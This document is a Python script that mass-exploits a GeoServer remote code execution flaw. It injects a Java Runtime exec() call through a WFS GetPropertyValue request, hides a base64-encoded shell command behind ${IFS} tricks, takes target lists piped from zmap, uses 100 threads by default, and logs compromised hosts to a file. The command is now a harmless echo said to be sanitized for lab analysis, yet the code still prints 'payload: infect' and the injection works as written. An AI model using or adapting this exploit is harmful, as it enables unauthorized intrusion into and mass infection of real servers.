import base64
import requests
import xml.etree.ElementTree as ET
import click
import concurrent.futures
import urllib3
from threading import Lock

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Lock for thread-safe file writing
file_lock = Lock()

class GeoServerExploit:
    def __init__(self, url: str):
        self.url = url
        self.payload_delivered = False

    def construct_command(self):
        # Former payload removed; keep command benign for lab analysis.
        cmd = 'echo "GeoServer lab test: hello from the sanitized script."'  # harmless placeholder
        cmd_b64 = base64.b64encode(cmd.encode()).decode()
        bash_command = f"sh -c echo${{IFS}}{cmd_b64}|base64${{IFS}}-d|sh"
        return bash_command

    def fetch_feature_types(self):
        feature_types = []
        try:
            response = requests.get(
                f"{self.url}/geoserver/wfs?request=ListStoredQueries&service=wfs&version=2.0.0",
                timeout=10,
                verify=False
            )
            if response.status_code == 200:
                tree = ET.fromstring(response.content)
                namespaces = {"wfs": "http://www.opengis.net/wfs/2.0"}
                feature_types = [
                    elem.text
                    for elem in tree.findall(".//wfs:ReturnFeatureType", namespaces)
                ]
        except Exception:
            pass
        return feature_types

    def execute_exploit(self, object_type):
        command = self.construct_command()
        full_url = f"{self.url}/geoserver/wfs"
        headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Accept": "*/*",
            "Accept-Language": "en-US;q=0.9,en;q=0.8",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36",
            "Connection": "close",
            "Cache-Control": "max-age=0",
            "Content-Type": "application/xml",
        }
        payload = f"""
            <wfs:GetPropertyValue service='WFS' version='2.0.0'
            xmlns:topp='http://www.openplans.org/topp'
            xmlns:fes='http://www.opengis.net/fes/2.0'
            xmlns:wfs='http://www.opengis.net/wfs/2.0'>
            <wfs:Query typeNames='{object_type}'/>
            <wfs:valueReference>exec(java.lang.Runtime.getRuntime(), "{command}")</wfs:valueReference>
            </wfs:GetPropertyValue>
        """
        try:
            response = requests.post(full_url, headers=headers, data=payload, verify=False, timeout=5)
            if response.status_code == 400 and "NoApplicableCode" in response.text:
                self.payload_delivered = True
                return True
        except Exception:
            pass
        return False

    def run(self):
        feature_types = self.fetch_feature_types()
        for feature_type in feature_types:
            if self.payload_delivered:
                break
            self.execute_exploit(feature_type)

def log_successful_url(url):
    """Log successful URLs to the geo_vuln.txt file."""
    with file_lock:
        with open("geo_vuln.txt", "a") as file:
            file.write(url + "\n")


def process_url(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url
    print(f"Running exploit on {url} with payload: infect")
    exploit = GeoServerExploit(url)
    exploit.run()
    if exploit.payload_delivered:
        print(f"Successfully exploited {url}.")
        log_successful_url(url)

@click.command()
@click.option("-w", "--workers", default=100, help="Number of worker threads")
def main(workers):
    stdin_stream = click.get_text_stream("stdin")
    if stdin_stream.isatty():
        raise click.UsageError("Provide addresses via stdin, e.g.: zmap ... | python x86.py -w 100")

    futures = {}

    def drain_completed():
        completed = [future for future in list(futures) if future.done()]
        for future in completed:
            url = futures.pop(future)
            try:
                future.result()
            except Exception as e:
                print(f"Error processing {url}: {e}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        for line in stdin_stream:
            url = line.strip()
            if not url:
                continue
            future = executor.submit(process_url, url)
            futures[future] = url
            drain_completed()

        for future in concurrent.futures.as_completed(list(futures)):
            url = futures.pop(future)
            try:
                future.result()
            except Exception as e:
                print(f"Error processing {url}: {e}")

if __name__ == "__main__":
    main()
